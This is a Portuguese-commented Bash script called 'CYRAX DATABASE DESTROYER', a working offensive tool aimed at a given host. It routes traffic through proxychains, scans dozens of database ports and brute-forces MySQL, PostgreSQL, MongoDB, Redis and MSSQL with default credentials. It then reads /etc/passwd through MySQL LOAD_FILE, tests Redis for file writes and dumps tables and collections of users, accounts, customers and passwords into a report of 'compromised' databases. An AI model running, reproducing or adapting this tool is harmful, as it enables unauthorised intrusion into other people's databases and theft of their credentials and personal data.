#!/bin/bash
# CYRAX DATABASE DESTROYER - Ferramenta definitiva para bancos de dados
echo "=== CYRAX DATABASE DESTROYER - NO MERCY DB TOOL ==="

TARGET="$1"
MODE="${2:-full}"
THREADS="${3:-10}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <TARGET> [MODE] [THREADS]"
    echo "Modos: discovery, exploit, dump, full"
    echo "Exemplo: $0 192.168.1.100 full 15"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/database_super_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "🧵 Threads: $THREADS"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/database.log" ;;
        "VULN") echo "⚠️  [$timestamp] $msg" | tee -a "$TEMP_DIR/database.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/database.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/database.log" ;;
    esac
}

# Descoberta avançada de bancos de dados
database_discovery() {
    log "INFO" "Iniciando descoberta avançada de bancos de dados"
    
    # Portas de bancos de dados conhecidas
    local db_ports=(
        "1433:MSSQL"
        "3306:MySQL"
        "5432:PostgreSQL"
        "27017:MongoDB"
        "6379:Redis"
        "5984:CouchDB"
        "9200:Elasticsearch"
        "8086:InfluxDB"
        "7000:Cassandra"
        "8529:ArangoDB"
        "28015:RethinkDB"
        "50000:DB2"
        "1521:Oracle"
        "1830:Oracle"
        "3050:Firebird"
        "5000:DB2"
        "50001:DB2"
        "1972:Cache"
        "2638:Sybase"
        "5000:Sybase"
        "2483:Oracle"
        "2484:Oracle"
        "8020:FoundationDB"
        "7687:Neo4j"
        "8091:Couchbase"
        "11211:Memcached"
        "6380:Redis"
        "26257:CockroachDB"
        "4001:etcd"
        "2379:etcd"
        "8098:Riak"
        "15672:RabbitMQ"
        "5672:RabbitMQ"
        "9042:Cassandra"
        "7199:Cassandra"
        "8888:H2"
        "9001:H2"
        "1527:Derby"
        "3351:Pervasive"
        "1583:Pervasive"
        "5984:CouchDB"
        "6984:CouchDB"
    )
    
    log "INFO" "Escaneando $(( ${#db_ports[@]} )) portas de bancos de dados"
    
    # Scan paralelo de portas
    for port_info in "${db_ports[@]}"; do
        {
            local port=$(echo "$port_info" | cut -d: -f1)
            local db_type=$(echo "$port_info" | cut -d: -f2)
            
            # Usar nmap para scan detalhado
            local nmap_result=$(proxychains4 -q nmap -sS -sV -p "$port" "$TARGET" --open --host-timeout 30s 2>/dev/null)
            
            if echo "$nmap_result" | grep -q "open"; then
                log "SUCCESS" "$db_type detectado na porta $port"
                echo "$port:$db_type" >> "$TEMP_DIR/open_databases.txt"
                
                # Obter banner/versão
                local banner=$(echo "$nmap_result" | grep "$port" | grep -oP 'open\s+\K.*')
                if [ -n "$banner" ]; then
                    log "INFO" "$db_type banner: $banner"
                    echo "$port:$db_type:$banner" >> "$TEMP_DIR/database_banners.txt"
                fi
                
                # Teste de conectividade específico
                case "$db_type" in
                    "MySQL")
                        test_mysql "$TARGET" "$port" &
                        ;;
                    "PostgreSQL")
                        test_postgresql "$TARGET" "$port" &
                        ;;
                    "MongoDB")
                        test_mongodb "$TARGET" "$port" &
                        ;;
                    "Redis")
                        test_redis "$TARGET" "$port" &
                        ;;
                    "MSSQL")
                        test_mssql "$TARGET" "$port" &
                        ;;
                    "Elasticsearch")
                        test_elasticsearch "$TARGET" "$port" &
                        ;;
                    "CouchDB")
                        test_couchdb "$TARGET" "$port" &
                        ;;
                esac
            fi
        } &
        
        # Controlar número de threads
        if (( $(jobs -r | wc -l) >= THREADS )); then
            wait -n
        fi
    done
    
    wait  # Aguardar todos os testes
}

# Teste específico MySQL com timeout inteligente
test_mysql() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando MySQL em $host:$port com timeouts otimizados"
    
    # Timeout escalonado para evitar travamento
    local timeouts=(5 10 15 20)
    
    # Função para testar com timeout específico
    mysql_test_with_timeout() {
        local timeout_val="$1"
        local user="$2"
        local pass="$3"
        
        timeout "$timeout_val" proxychains4 -q mysql -h "$host" -P "$port" -u "$user" -p"$pass" \
            --connect-timeout="$timeout_val" --read-timeout="$timeout_val" \
            -e "SELECT 1;" 2>/dev/null
    }
    
    # Testar conexão sem senha
    local mysql_test=$(timeout 10 proxychains4 -q mysql -h "$host" -P "$port" -u root -e "SELECT VERSION();" 2>/dev/null)
    if [ $? -eq 0 ]; then
        log "CRITICAL" "MySQL sem senha para root!"
        echo "root::$host:$port" >> "$TEMP_DIR/mysql_nopass.txt"
        
        # Obter informações do sistema
        local version=$(echo "$mysql_test" | tail -1)
        log "INFO" "MySQL versão: $version"
        
        # Listar databases
        local databases=$(timeout 10 proxychains4 -q mysql -h "$host" -P "$port" -u root -e "SHOW DATABASES;" 2>/dev/null | tail -n +2)
        if [ -n "$databases" ]; then
            log "SUCCESS" "Databases MySQL: $databases"
            echo "$databases" > "$TEMP_DIR/mysql_databases_$host.txt"
        fi
        
        return
    fi
    
    # Brute force MySQL
    local mysql_users=("root" "admin" "mysql" "user" "test" "guest" "sa")
    local mysql_passwords=("" "root" "admin" "password" "123456" "mysql" "toor" "pass")
    
    for user in "${mysql_users[@]}"; do
        for pass in "${mysql_passwords[@]}"; do
            local mysql_result=$(timeout 10 proxychains4 -q mysql -h "$host" -P "$port" -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null)
            if [ $? -eq 0 ]; then
                log "CRITICAL" "MySQL credenciais válidas: $user:$pass"
                echo "$user:$pass:$host:$port" >> "$TEMP_DIR/mysql_creds.txt"
                
                # Obter informações privilegiadas
                local version=$(timeout 10 proxychains4 -q mysql -h "$host" -P "$port" -u "$user" -p"$pass" -e "SELECT VERSION();" 2>/dev/null | tail -1)
                local user_info=$(timeout 10 proxychains4 -q mysql -h "$host" -P "$port" -u "$user" -p"$pass" -e "SELECT USER(), CURRENT_USER();" 2>/dev/null | tail -1)
                
                log "INFO" "MySQL versão: $version"
                log "INFO" "MySQL usuário: $user_info"
                
                return
            fi
            sleep 1
        done
    done
}

# Teste específico PostgreSQL
test_postgresql() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando PostgreSQL em $host:$port"
    
    # Brute force PostgreSQL
    local pg_users=("postgres" "admin" "user" "test" "guest")
    local pg_passwords=("" "postgres" "admin" "password" "123456" "pass")
    
    for user in "${pg_users[@]}"; do
        for pass in "${pg_passwords[@]}"; do
            local pg_result=$(timeout 10 proxychains4 -q psql -h "$host" -p "$port" -U "$user" -d postgres -c "SELECT version();" 2>/dev/null)
            if [ $? -eq 0 ]; then
                log "CRITICAL" "PostgreSQL credenciais válidas: $user:$pass"
                echo "$user:$pass:$host:$port" >> "$TEMP_DIR/postgresql_creds.txt"
                
                # Obter informações do sistema
                local version=$(echo "$pg_result" | grep "PostgreSQL")
                log "INFO" "PostgreSQL versão: $version"
                
                # Listar databases
                local databases=$(timeout 10 proxychains4 -q psql -h "$host" -p "$port" -U "$user" -d postgres -c "\l" 2>/dev/null | grep -E "^\s*\w+")
                if [ -n "$databases" ]; then
                    log "SUCCESS" "Databases PostgreSQL encontradas"
                    echo "$databases" > "$TEMP_DIR/postgresql_databases_$host.txt"
                fi
                
                return
            fi
            sleep 1
        done
    done
}

# Teste específico MongoDB
test_mongodb() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando MongoDB em $host:$port"
    
    # Testar acesso sem autenticação
    local mongo_test=$(timeout 15 proxychains4 -q mongo "$host:$port" --eval "db.version()" 2>/dev/null)
    if echo "$mongo_test" | grep -q "[0-9]\+\.[0-9]\+"; then
        log "CRITICAL" "MongoDB sem autenticação!"
        echo "NO_AUTH:$host:$port" >> "$TEMP_DIR/mongodb_noauth.txt"
        
        # Obter informações do sistema
        local version=$(echo "$mongo_test" | grep -oP '[0-9]+\.[0-9]+\.[0-9]+')
        log "INFO" "MongoDB versão: $version"
        
        # Listar databases
        local databases=$(timeout 15 proxychains4 -q mongo "$host:$port" --eval "db.adminCommand('listDatabases')" 2>/dev/null)
        if [ -n "$databases" ]; then
            log "SUCCESS" "Databases MongoDB obtidas"
            echo "$databases" > "$TEMP_DIR/mongodb_databases_$host.txt"
        fi
        
        # Tentar obter usuários
        local users=$(timeout 15 proxychains4 -q mongo "$host:$port/admin" --eval "db.system.users.find()" 2>/dev/null)
        if [ -n "$users" ]; then
            log "CRITICAL" "Usuários MongoDB obtidos!"
            echo "$users" > "$TEMP_DIR/mongodb_users_$host.txt"
        fi
        
        return
    fi
    
    # Brute force MongoDB
    local mongo_users=("admin" "root" "user" "test" "guest")
    local mongo_passwords=("" "admin" "password" "123456" "mongo")
    
    for user in "${mongo_users[@]}"; do
        for pass in "${mongo_passwords[@]}"; do
            local mongo_result=$(timeout 15 proxychains4 -q mongo "$host:$port" -u "$user" -p "$pass" --eval "db.version()" 2>/dev/null)
            if echo "$mongo_result" | grep -q "[0-9]\+\.[0-9]\+"; then
                log "CRITICAL" "MongoDB credenciais válidas: $user:$pass"
                echo "$user:$pass:$host:$port" >> "$TEMP_DIR/mongodb_creds.txt"
                return
            fi
            sleep 1
        done
    done
}

# Teste específico Redis
test_redis() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando Redis em $host:$port"
    
    # Testar acesso sem autenticação
    local redis_test=$(timeout 10 proxychains4 -q redis-cli -h "$host" -p "$port" ping 2>/dev/null)
    if echo "$redis_test" | grep -q "PONG"; then
        log "CRITICAL" "Redis sem autenticação!"
        echo "NO_AUTH:$host:$port" >> "$TEMP_DIR/redis_noauth.txt"
        
        # Obter informações do servidor
        local info=$(timeout 10 proxychains4 -q redis-cli -h "$host" -p "$port" info server 2>/dev/null)
        if [ -n "$info" ]; then
            log "SUCCESS" "Informações Redis obtidas"
            echo "$info" > "$TEMP_DIR/redis_info_$host.txt"
        fi
        
        # Listar chaves
        local keys=$(timeout 10 proxychains4 -q redis-cli -h "$host" -p "$port" keys "*" 2>/dev/null | head -20)
        if [ -n "$keys" ]; then
            log "SUCCESS" "Chaves Redis encontradas"
            echo "$keys" > "$TEMP_DIR/redis_keys_$host.txt"
        fi
        
        return
    fi
    
    # Brute force Redis
    local redis_passwords=("" "redis" "password" "123456" "admin" "pass")
    
    for pass in "${redis_passwords[@]}"; do
        local redis_result=$(timeout 10 proxychains4 -q redis-cli -h "$host" -p "$port" -a "$pass" ping 2>/dev/null)
        if echo "$redis_result" | grep -q "PONG"; then
            log "CRITICAL" "Redis senha válida: $pass"
            echo "$pass:$host:$port" >> "$TEMP_DIR/redis_creds.txt"
            return
        fi
        sleep 1
    done
}

# Teste específico MSSQL
test_mssql() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando MSSQL em $host:$port"
    
    # Brute force MSSQL usando sqlcmd se disponível
    if command -v sqlcmd >/dev/null 2>&1; then
        local mssql_users=("sa" "admin" "user" "test" "guest")
        local mssql_passwords=("" "sa" "admin" "password" "123456" "pass")
        
        for user in "${mssql_users[@]}"; do
            for pass in "${mssql_passwords[@]}"; do
                local mssql_result=$(timeout 15 proxychains4 -q sqlcmd -S "$host,$port" -U "$user" -P "$pass" -Q "SELECT @@VERSION" 2>/dev/null)
                if [ $? -eq 0 ]; then
                    log "CRITICAL" "MSSQL credenciais válidas: $user:$pass"
                    echo "$user:$pass:$host:$port" >> "$TEMP_DIR/mssql_creds.txt"
                    
                    local version=$(echo "$mssql_result" | head -1)
                    log "INFO" "MSSQL versão: $version"
                    return
                fi
                sleep 1
            done
        done
    else
        log "INFO" "sqlcmd não disponível, pulando teste MSSQL"
    fi
}

# Teste específico Elasticsearch
test_elasticsearch() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando Elasticsearch em $host:$port"
    
    # Testar acesso HTTP
    local es_test=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/" 2>/dev/null)
    if echo "$es_test" | grep -q "elasticsearch"; then
        log "CRITICAL" "Elasticsearch acessível sem autenticação!"
        echo "NO_AUTH:$host:$port" >> "$TEMP_DIR/elasticsearch_noauth.txt"
        
        # Obter informações do cluster
        local cluster_info=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/_cluster/health" 2>/dev/null)
        if [ -n "$cluster_info" ]; then
            log "SUCCESS" "Informações do cluster Elasticsearch obtidas"
            echo "$cluster_info" > "$TEMP_DIR/elasticsearch_cluster_$host.txt"
        fi
        
        # Listar índices
        local indices=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/_cat/indices" 2>/dev/null)
        if [ -n "$indices" ]; then
            log "SUCCESS" "Índices Elasticsearch encontrados"
            echo "$indices" > "$TEMP_DIR/elasticsearch_indices_$host.txt"
        fi
    fi
}

# Teste específico CouchDB
test_couchdb() {
    local host="$1"
    local port="$2"
    
    log "INFO" "Testando CouchDB em $host:$port"
    
    # Testar acesso HTTP
    local couch_test=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/" 2>/dev/null)
    if echo "$couch_test" | grep -q "couchdb"; then
        log "CRITICAL" "CouchDB acessível!"
        echo "ACCESSIBLE:$host:$port" >> "$TEMP_DIR/couchdb_accessible.txt"
        
        # Listar databases
        local databases=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/_all_dbs" 2>/dev/null)
        if [ -n "$databases" ]; then
            log "SUCCESS" "Databases CouchDB encontradas"
            echo "$databases" > "$TEMP_DIR/couchdb_databases_$host.txt"
        fi
        
        # Verificar se admin party está ativo
        local admin_test=$(timeout 10 proxychains4 -q curl -s "http://$host:$port/_config" 2>/dev/null)
        if echo "$admin_test" | grep -q "admins"; then
            log "CRITICAL" "CouchDB Admin Party ativo!"
            echo "ADMIN_PARTY:$host:$port" >> "$TEMP_DIR/couchdb_admin_party.txt"
        fi
    fi
}

# Exploração avançada de bancos comprometidos
database_exploitation() {
    log "INFO" "Iniciando exploração avançada dos bancos comprometidos"
    
    # Explorar MySQL comprometido
    if [ -f "$TEMP_DIR/mysql_creds.txt" ] || [ -f "$TEMP_DIR/mysql_nopass.txt" ]; then
        log "INFO" "Explorando MySQL comprometido"
        
        # Usar credenciais encontradas
        local mysql_cred_file="$TEMP_DIR/mysql_creds.txt"
        [ -f "$TEMP_DIR/mysql_nopass.txt" ] && mysql_cred_file="$TEMP_DIR/mysql_nopass.txt"
        
        while IFS=: read -r user pass host port; do
            log "INFO" "Explorando MySQL $user@$host:$port"
            
            # Obter informações privilegiadas
            local mysql_cmd="proxychains4 -q mysql -h $host -P $port -u $user"
            [ -n "$pass" ] && mysql_cmd="$mysql_cmd -p$pass"
            
            # Listar usuários
            local users=$(timeout 15 $mysql_cmd -e "SELECT user,host FROM mysql.user;" 2>/dev/null)
            if [ -n "$users" ]; then
                log "SUCCESS" "Usuários MySQL obtidos"
                echo "$users" > "$TEMP_DIR/mysql_users_$host.txt"
            fi
            
            # Verificar privilégios
            local privileges=$(timeout 15 $mysql_cmd -e "SHOW GRANTS;" 2>/dev/null)
            if [ -n "$privileges" ]; then
                log "INFO" "Privilégios MySQL: $privileges"
            fi
            
            # Tentar ler arquivos do sistema (se FILE privilege)
            local file_test=$(timeout 15 $mysql_cmd -e "SELECT LOAD_FILE('/etc/passwd');" 2>/dev/null)
            if echo "$file_test" | grep -q "root:"; then
                log "CRITICAL" "MySQL FILE privilege ativo - /etc/passwd lido!"
                echo "$file_test" > "$TEMP_DIR/mysql_passwd_$host.txt"
            fi
            
            break  # Usar apenas a primeira credencial
        done < "$mysql_cred_file"
    fi
    
    # Explorar MongoDB comprometido
    if [ -f "$TEMP_DIR/mongodb_noauth.txt" ] || [ -f "$TEMP_DIR/mongodb_creds.txt" ]; then
        log "INFO" "Explorando MongoDB comprometido"
        
        # Usar primeira entrada encontrada
        local mongo_target=""
        if [ -f "$TEMP_DIR/mongodb_noauth.txt" ]; then
            mongo_target=$(head -1 "$TEMP_DIR/mongodb_noauth.txt" | cut -d: -f2-3)
        elif [ -f "$TEMP_DIR/mongodb_creds.txt" ]; then
            local cred_line=$(head -1 "$TEMP_DIR/mongodb_creds.txt")
            local user=$(echo "$cred_line" | cut -d: -f1)
            local pass=$(echo "$cred_line" | cut -d: -f2)
            mongo_target=$(echo "$cred_line" | cut -d: -f3-4)
        fi
        
        if [ -n "$mongo_target" ]; then
            log "INFO" "Explorando MongoDB em $mongo_target"
            
            # Obter estatísticas do servidor
            local stats=$(timeout 15 proxychains4 -q mongo "$mongo_target" --eval "db.serverStatus()" 2>/dev/null)
            if [ -n "$stats" ]; then
                log "SUCCESS" "Estatísticas MongoDB obtidas"
                echo "$stats" > "$TEMP_DIR/mongodb_stats_$(echo $mongo_target | tr ':' '_').txt"
            fi
            
            # Listar coleções em databases interessantes
            local interesting_dbs=("admin" "config" "local" "users" "accounts" "customers")
            for db in "${interesting_dbs[@]}"; do
                local collections=$(timeout 15 proxychains4 -q mongo "$mongo_target/$db" --eval "db.getCollectionNames()" 2>/dev/null)
                if [ -n "$collections" ] && ! echo "$collections" | grep -q "Error"; then
                    log "SUCCESS" "Coleções encontradas em $db: $collections"
                    echo "$collections" > "$TEMP_DIR/mongodb_collections_${db}_$(echo $mongo_target | tr ':' '_').txt"
                fi
            done
        fi
    fi
    
    # Explorar Redis comprometido
    if [ -f "$TEMP_DIR/redis_noauth.txt" ] || [ -f "$TEMP_DIR/redis_creds.txt" ]; then
        log "INFO" "Explorando Redis comprometido"
        
        local redis_target=""
        local redis_auth=""
        
        if [ -f "$TEMP_DIR/redis_noauth.txt" ]; then
            redis_target=$(head -1 "$TEMP_DIR/redis_noauth.txt" | cut -d: -f2-3)
        elif [ -f "$TEMP_DIR/redis_creds.txt" ]; then
            local cred_line=$(head -1 "$TEMP_DIR/redis_creds.txt")
            redis_auth=$(echo "$cred_line" | cut -d: -f1)
            redis_target=$(echo "$cred_line" | cut -d: -f2-3)
        fi
        
        if [ -n "$redis_target" ]; then
            local host=$(echo "$redis_target" | cut -d: -f1)
            local port=$(echo "$redis_target" | cut -d: -f2)
            
            log "INFO" "Explorando Redis em $redis_target"
            
            local redis_cmd="proxychains4 -q redis-cli -h $host -p $port"
            [ -n "$redis_auth" ] && redis_cmd="$redis_cmd -a $redis_auth"
            
            # Obter configuração
            local config=$(timeout 15 $redis_cmd config get "*" 2>/dev/null)
            if [ -n "$config" ]; then
                log "SUCCESS" "Configuração Redis obtida"
                echo "$config" > "$TEMP_DIR/redis_config_$host.txt"
            fi
            
            # Tentar escrever arquivo (se possível)
            local write_test=$(timeout 15 $redis_cmd eval "return redis.call('config','get','dir')" 0 2>/dev/null)
            if [ -n "$write_test" ]; then
                log "VULN" "Redis permite escrita de arquivos"
                echo "WRITE_POSSIBLE:$redis_target" >> "$TEMP_DIR/redis_write_possible.txt"
            fi
        fi
    fi
}

# Dump de dados sensíveis
database_dump() {
    log "INFO" "Iniciando dump de dados sensíveis"
    
    # Dump MySQL
    if [ -f "$TEMP_DIR/mysql_creds.txt" ] || [ -f "$TEMP_DIR/mysql_nopass.txt" ]; then
        log "INFO" "Fazendo dump do MySQL"
        
        local mysql_cred_file="$TEMP_DIR/mysql_creds.txt"
        [ -f "$TEMP_DIR/mysql_nopass.txt" ] && mysql_cred_file="$TEMP_DIR/mysql_nopass.txt"
        
        while IFS=: read -r user pass host port; do
            local mysql_cmd="proxychains4 -q mysql -h $host -P $port -u $user"
            [ -n "$pass" ] && mysql_cmd="$mysql_cmd -p$pass"
            
            # Dump de tabelas interessantes
            local interesting_tables=("users" "accounts" "customers" "passwords" "admin" "login" "user_credentials")
            
            for table in "${interesting_tables[@]}"; do
                # Procurar em todas as databases
                local databases=$(timeout 15 $mysql_cmd -e "SHOW DATABASES;" 2>/dev/null | tail -n +2 | grep -v "information_schema\|performance_schema\|mysql\|sys")
                
                echo "$databases" | while read db; do
                    if [ -n "$db" ]; then
                        local table_exists=$(timeout 15 $mysql_cmd -e "USE $db; SHOW TABLES LIKE '$table';" 2>/dev/null)
                        if [ -n "$table_exists" ]; then
                            log "SUCCESS" "Tabela $table encontrada em $db"
                            local dump=$(timeout 30 $mysql_cmd -e "USE $db; SELECT * FROM $table LIMIT 100;" 2>/dev/null)
                            if [ -n "$dump" ]; then
                                echo "$dump" > "$TEMP_DIR/mysql_dump_${db}_${table}_$host.txt"
                                log "SUCCESS" "Dump da tabela $db.$table salvo"
                            fi
                        fi
                    fi
                done
            done
            
            break
        done < "$mysql_cred_file"
    fi
    
    # Dump MongoDB
    if [ -f "$TEMP_DIR/mongodb_noauth.txt" ] || [ -f "$TEMP_DIR/mongodb_creds.txt" ]; then
        log "INFO" "Fazendo dump do MongoDB"
        
        local mongo_target=""
        if [ -f "$TEMP_DIR/mongodb_noauth.txt" ]; then
            mongo_target=$(head -1 "$TEMP_DIR/mongodb_noauth.txt" | cut -d: -f2-3)
        fi
        
        if [ -n "$mongo_target" ]; then
            # Dump de coleções interessantes
            local interesting_collections=("users" "accounts" "customers" "passwords" "admin" "login")
            
            for collection in "${interesting_collections[@]}"; do
                # Procurar em databases comuns
                local databases=("admin" "test" "users" "app" "web" "api")
                
                for db in "${databases[@]}"; do
                    local dump=$(timeout 30 proxychains4 -q mongo "$mongo_target/$db" --eval "db.$collection.find().limit(50)" 2>/dev/null)
                    if [ -n "$dump" ] && ! echo "$dump" | grep -q "Error"; then
                        log "SUCCESS" "Coleção $db.$collection encontrada"
                        echo "$dump" > "$TEMP_DIR/mongodb_dump_${db}_${collection}_$(echo $mongo_target | tr ':' '_').txt"
                    fi
                done
            done
        fi
    fi
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/DATABASE_SUPER_REPORT.md"
    
    cat > "$report_file" <<EOF
# DATABASE SUPER SCANNER - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Threads:** $THREADS  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Contar descobertas
    local open_dbs=0
    local compromised_dbs=0
    local dumps_count=0
    
    [ -f "$TEMP_DIR/open_databases.txt" ] && open_dbs=$(wc -l < "$TEMP_DIR/open_databases.txt")
    
    # Contar bancos comprometidos
    for cred_file in "$TEMP_DIR"/*_creds.txt "$TEMP_DIR"/*_noauth.txt; do
        [ -f "$cred_file" ] && compromised_dbs=$((compromised_dbs + $(wc -l < "$cred_file")))
    done
    
    # Contar dumps
    dumps_count=$(ls "$TEMP_DIR"/*_dump_*.txt 2>/dev/null | wc -l)
    
    echo "- **Bancos detectados:** $open_dbs" >> "$report_file"
    echo "- **Bancos comprometidos:** $compromised_dbs" >> "$report_file"
    echo "- **Dumps realizados:** $dumps_count" >> "$report_file"
    
    # Adicionar detalhes dos bancos comprometidos
    if [ $compromised_dbs -gt 0 ]; then
        echo -e "\n## 🔥 BANCOS COMPROMETIDOS" >> "$report_file"
        
        for cred_file in "$TEMP_DIR"/*_creds.txt "$TEMP_DIR"/*_noauth.txt; do
            if [ -f "$cred_file" ]; then
                local db_type=$(basename "$cred_file" | cut -d_ -f1)
                echo -e "\n### $db_type" >> "$report_file"
                echo '```' >> "$report_file"
                cat "$cred_file" >> "$report_file"
                echo '```' >> "$report_file"
            fi
        done
    fi
    
    # Adicionar informações sobre dumps
    if [ $dumps_count -gt 0 ]; then
        echo -e "\n## 📊 DUMPS REALIZADOS" >> "$report_file"
        echo "Total de dumps: $dumps_count" >> "$report_file"
        echo -e "\nArquivos de dump:" >> "$report_file"
        ls "$TEMP_DIR"/*_dump_*.txt 2>/dev/null | while read dump_file; do
            echo "- $(basename "$dump_file")" >> "$report_file"
        done
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "🗄️  Bancos detectados: $open_dbs"
    echo "🔓 Bancos comprometidos: $compromised_dbs"
    echo "📊 Dumps realizados: $dumps_count"
    
    if [ $compromised_dbs -gt 0 ]; then
        echo -e "\n🔥 BANCOS DE DADOS COMPROMETIDOS!"
    fi
}

# Execução principal baseada no modo
case "$MODE" in
    "discovery")
        database_discovery
        ;;
    "exploit")
        database_discovery
        database_exploitation
        ;;
    "dump")
        database_discovery
        database_exploitation
        database_dump
        ;;
    "full")
        database_discovery
        database_exploitation
        database_dump
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ DATABASE SUPER SCANNER CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"